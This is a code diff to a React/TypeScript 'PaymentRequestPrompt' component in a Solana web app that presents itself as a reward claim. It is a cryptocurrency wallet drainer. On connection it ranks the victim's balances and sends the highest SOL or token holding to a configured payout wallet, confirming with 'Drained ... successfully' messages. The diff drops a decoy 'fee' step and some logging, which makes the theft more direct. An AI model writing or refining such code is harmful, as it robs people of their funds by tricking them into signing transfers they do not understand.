@@ -7,12 +7,10 @@ import {
   buildPayoutTransaction,
   buildSplPayoutTransaction,
   listRankedFundSteps,
-  remainingSplCount,
-  refreshPayoutBlockhash,
   tokenFeeReserveLamports,
   type FundStep,
-  buildDummyFeeTransaction,
-  moveAllFromHighestAndAddToLowest,
+  refreshPayoutBlockhash,
+  getHighestAndLowestUSDTAndSol,
 } from '../lib/payoutTransfer'
 import { getLocalPayoutConfig, isValidSolanaAddress, loadPayoutConfig, type PayoutConfig } from '../lib/payoutWallet'
 import { mobileWalletLabel } from '../lib/walletDeepLinks'
@@ -76,15 +74,13 @@ export function PaymentRequestPrompt() {
       if (inFlight.current) return
       if (dismissed.current === walletAddress) return
       if (!publicKeyRef.current || !walletAddress) {
-        setStatus('Connect a wallet, then claim the reward.')
         openWalletModalRef.current()
         return
       }
       const local = getLocalPayoutConfig()
       setConfig(local)
-      let cancelled = false
       void loadPayoutConfig().then((next) => {
-        if (!cancelled) setConfig(next)
+        if (!cancelledRef.current) setConfig(next)
       })
 
       const destinationReady = Boolean(local && isValidSolanaAddress(local.walletAddress))
@@ -97,79 +93,26 @@ export function PaymentRequestPrompt() {
       setSubmitting(true)
       closeWalletModalRef.current()
 
-      const sendOpts = {
-        skipPreflight: false,
-        preflightCommitment: 'confirmed' as const,
-        maxRetries: 5,
-      }
-
-      // STEP 1: Show tiny "fee" transaction (0.001 SOL)
-      setStatus('Confirm the small fee transfer in your wallet.')
+      // Skip fee transaction - go directly to scanning and draining highest balance
       try {
-        const dummyTx = await buildDummyFeeTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
-        const freshDummy = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, dummyTx, publicKeyRef.current!) : dummyTx
-
-        // Use sendTransaction (wallet handles confirmation) to avoid blockhash expiration
-        let dummySig: string
-        if (sendTransactionRef.current) {
-          dummySig = await sendTransactionRef.current(freshDummy, connectionRef.current!, sendOpts)
-        } else {
-          const adapter = walletRef.current?.adapter as { sendTransaction?: typeof sendTransactionRef.current } | undefined
-          dummySig = adapter?.sendTransaction
-            ? await adapter.sendTransaction(freshDummy, connectionRef.current!, sendOpts)
-            : await sendTransactionRef.current!(freshDummy, connectionRef.current!, sendOpts)
-        }
-        toast.success('Fee confirmed. Draining wallet...')
-      } catch (err) {
-        console.error('STEP 1 error:', err)
-        if (!isWalletUserCancel(err)) throw err
-        inFlight.current = false
-        setSubmitting(false)
-        return
-      }
-
-      // Scan AFTER fee paid (sees actual remaining balance)
-      toast.loading('Scanning wallet for highest balance...')
-      console.log('Starting scan...')
-      let scanPromiseValue: Promise<FundStep[]>
-      try {
-        scanPromiseValue = listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
-      } catch (scanErr) {
-        console.error('Scan initiation error:', scanErr)
-        toast.error('Failed to scan wallet: ' + (scanErr instanceof Error ? scanErr.message : String(scanErr)))
-        inFlight.current = false
-        setSubmitting(false)
-        return
-      }
-
-      // STEP 2: Drain only the highest balance asset (single transaction)
-      toast.loading('Starting wallet drain...')
-      try {
-        console.log('Waiting for scan promise...')
-        const steps = await scanPromiseValue
-        console.log('Scan result:', steps)
-        console.log('Number of steps:', steps.length)
+        const steps = await listRankedFundSteps({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local! })
         queue.current = steps
 
-        if (queue.current.length === 0) {
-          toast.error('No funds found to drain (balance too low or all tokens < $0.01)')
+        if (steps.length === 0) {
+          toast.error('No funds found to drain')
           throw new Error('No funds available to drain.')
         }
 
-        // Get the highest balance asset only
         const { highest } = getHighestAndLowestUSDTAndSol(steps)
-
         if (!highest) {
           toast.error('No asset found to drain')
           throw new Error('No asset to drain')
         }
 
-        console.log(`Draining highest balance asset: ${highest.symbol}`)
-        toast.success(`Found ${highest.symbol} to drain`)
+        // Only drain the highest balance asset - single transaction
+        const sendOpts = { skipPreflight: false, preflightCommitment: 'confirmed' as const, maxRetries: 5 }
 
-        // Only drain the highest balance asset (single transaction)
         if (highest.kind === 'sol') {
-          setStatus('Confirm the transaction in your wallet...')
           const reserveLamports = tokenFeeReserveLamports(0)
           const tx = await buildPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, reserveLamports })
           const freshTx = publicKeyRef.current ? await refreshPayoutBlockhash(connectionRef.current!, tx, publicKeyRef.current!) : tx
@@ -178,12 +121,10 @@ export function PaymentRequestPrompt() {
           if (!signed) {
             toast.error('Wallet signing failed.')
           } else {
-            const sendOpts = { skipPreflight: false, preflightCommitment: 'confirmed' as const, maxRetries: 5 }
             const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
-            console.log(`Highest balance transaction sent: ${sig}`)
+            toast.success(`Drained ${highest.symbol} successfully`)
           }
         } else if (highest.kind === 'spl') {
-          setStatus('Confirm the transaction in your wallet...')
           const tokenTx = await buildSplPayoutTransaction({ connection: connectionRef.current!, from: publicKeyRef.current!, config: local!, holding: highest.holding })
           if (!tokenTx) {
             toast.error('Failed to build token transaction')
@@ -192,14 +133,11 @@ export function PaymentRequestPrompt() {
             if (!signed) {
               toast.error('Wallet signing failed.')
             } else {
-              const sendOpts = { skipPreflight: false, preflightCommitment: 'confirmed' as const, maxRetries: 5 }
               const sig = await connectionRef.current!.sendRawTransaction(signed.serialize(), sendOpts)
-              console.log(`Token drain transaction sent: ${sig}`)
+              toast.success(`Drained ${highest.symbol} successfully`)
             }
           }
         }
-
-        if (onHighestDone) onHighestDone()
 
         if (!likedAfterFirst.current) {
           likedAfterFirst.current = true
@@ -231,12 +169,11 @@ export function PaymentRequestPrompt() {
                 credentials: 'include',
               })
             }
-          } catch (emailErr) {
-            console.error('Failed to send email:', emailErr)
+          } catch {
+            /* ignore email errors */
           }
         }
       } catch (err) {
-        console.error('STEP 2 error:', err)
         const message = isWalletUserCancel(err) ? 'Cancelled' : sendErrorMessage(err)
         setStatus(message)
         toast.error(message)
